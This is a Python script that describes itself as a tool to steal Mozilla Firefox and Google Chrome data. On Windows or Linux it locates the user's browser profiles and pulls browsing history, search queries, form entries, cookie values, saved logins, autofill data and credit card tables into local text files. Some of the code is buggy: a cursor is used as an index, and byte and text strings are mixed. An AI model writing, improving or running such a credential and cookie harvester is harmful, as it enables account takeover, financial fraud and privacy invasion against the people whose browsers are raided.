# Simple Tool for steal mozilla and google chrome data storage
# 
# 
# In this script may be add more functionality 
# 
# It works with windows and linux 
# 
# 

import sqlite3
import re
import getpass
import os
import platform



def getLINUXDB():
                    username=getpass.getuser() # Get username
                    getprofile=''
                    CWDLINUX='/home/'+username+'/.mozilla/firefox/' 

                    array = os.listdir(CWDLINUX) # Get listing dir

                    profilelist = []
                    for x in array:
                            if x.find('.default') == -1:
                                            continue
                            else:
                                    profilelist.append(CWDLINUX+x)


                    
                    return profilelist

def getWINDOWSDB():
                    username=getpass.getuser() # Get username
                    CWD='C:\\Users\\'+username+'\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\'
                    
                    array = os.listdir(CWD) # Get listing dir

                    profilelist = []
                    for x in array:
                            if x.find('.default') == -1:
                                    continue
                            else:
                                
                                profilelist.append(CWD+x)
                    
                    
                    return profilelist

def getWINDOWSGOOGLEDB():
                    username=getpass.getuser() # Get username
                    CWD='C:\\Users\\'+username+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
                       
                    
                    return CWD



def printGOOGLEHistory(DB,out_file):
            try:
                out_file.write('History \n')
                DB=DB+'History'
                print (DB)
                
                conn = sqlite3.connect(DB)
                c= conn.cursor()
                c.execute('select url,title from urls;')
                for row in c:
                    url=row[0].encode('utf-8').strip() # encode characther (no using str)
                    title=row[1].encode('utf-8').strip()
                    
                    out_file.write(url+' '+title+' '+'\n')
                    
            except Exception as var:
                print (var)


def printGOOGLELogin(DB,out_file):
            try:
                out_file.write('Login Data Google Chrome\n')
                DB=DB+'\Login Data'
                conn = sqlite3.connect(DB)
                c= conn.cursor()
                c.execute('select * from logins;')
                for row in c:
                    out_file.write(row[c])
                out_file.write('\n')
            except Exception as var:
                print (var)
def printGOOGLEWebdata(DB,out_file):

            
             try:
                out_file.write('Web data Google Chrome\n')
                DB=DB+'\Web Data'
                conn = sqlite3.connect(DB)
                c= conn.cursor()
                c.execute('select * from autofill;')
                for row in c:
                    out_file.write(row[c])
                out_file.write('\n')
                c.execute('select * from credit_cards;')
                for row in c:
                    out_file.write(row[c])
                out_file.write('\n')
             except Exception as var:
                print (var)


def printCookie(DB,out_file,flag):
   
    try:
            for path in DB:
                if flag == 0: # (Windows)
                    path=path+'\cookies.sqlite' 
                else: # (Linux)
                    path=path+'/cookies.sqlite'
                conn = sqlite3.connect(path)
                c= conn.cursor()
                c.execute('select host,name, value from moz_cookies;')
                out_file.write("\n[*] ---- Mozilla Cookie ---- \n")
                for row in c:
                    host=str(row[0])
                    name=str(row[1])
                    value=str(row[2])
                    print (host+' '+name+' '+value)
                    out_file.write(host+' '+name+' '+value+'\n')
    except Exception as var:
                 print (var)
                 
                 
def printFORMHISTORY(DB,out_file,flag):
    
    try:
            for path in DB:
                if flag == 0: # (Windows)
                    path=path+'\formhistory.sqlite' 
                else: # (Linux)
                    path=path+'/formhistory.sqlite'
                conn = sqlite3.connect(path)
                c= conn.cursor()
                c.execute('select fieldname,value from moz_formhistory;')
                out_file.write("\n[*] ---- Mozilla form history ---- \n")
                for row in c:
                    fieldname=str(row[0])
                    value=str(row[1])
                    print (fieldname+' '+value)
                    out_file.write(fieldname+' '+value+'\n')
    except Exception as var:
                 print (var)
                
                
def printURLVISITED(DB,out_file,flag):
    
        
    try:
            for path in DB:
                    if flag == 0: # (Windows)
                        path=path+'\places.sqlite' 
                    else: # (Linux)
                        path=path+'/places.sqlite'
                    conn = sqlite3.connect(path)
                    c = conn.cursor()
                    c.execute('select url,datetime(visit_date/1000000,"unixepoch") from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;')
                    out_file.write("\n[*] ---- Url visited ---- \n")
                    for row in c:
                            url = str(row[0])
                            date = str(row[1])
                            print (url+' '+date)
                            
                            out_file.write(url+' '+date+'\n')
                            
    except Exception as var:
                 print (var)
                 
            

def printGoogleSearchMozilla(DB,out_file,flag):
    
    try:

            for path in DB:
                if flag == 0: # (Windows)
                        path=path+'\places.sqlite'
                else: # (Linux)
                        path=path+'/places.sqlite'
                conn = sqlite3.connect(path)
                c = conn.cursor()
                c.execute('select url,datetime(visit_date/1000000,"unixepoch") from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;')
                out_file.write("\n[*] ---- Google research ---- \n")
                for row in c:
                    url = str(row[0])
                    date = str(row[1])
                    if 'google' in url.lower() or 'duckduckgo' in url.lower() or 'bing' in url.lower():
                        r = re.findall(r'q=.*\&',url)
                        if r:
                            search=r[0].split('&')[0]
                            search=search.replace('q=','').replace('+', ' ')
                            print ('[+] '+date+' searched for: '+search)
                            out_file.write('[+] '+date+' searched for: '+search+'\n')
    except Exception as var:
            print (var)
            

flag = 0

if platform.system() in "Linux":
        placesDB = getLINUXDB()
        flag = 1  # flag in linux
if platform.system() in "Windows":
        placesDB = getWINDOWSDB()

placesDBGOOGLE=getWINDOWSGOOGLEDB()

out_moz_file = open('outputmozilla.txt','w+')
out_google_file = open('outputgoogle.txt','w+')
printURLVISITED(placesDB,out_moz_file,flag)
printGoogleSearchMozilla(placesDB,out_moz_file,flag)
printFORMHISTORY(placesDB,out_moz_file,flag)
printCookie(placesDB,out_moz_file,flag)
printGOOGLEHistory(placesDBGOOGLE,out_google_file)
printGOOGLELogin(placesDBGOOGLE,out_google_file)
printGOOGLEWebdata(placesDBGOOGLE,out_google_file)
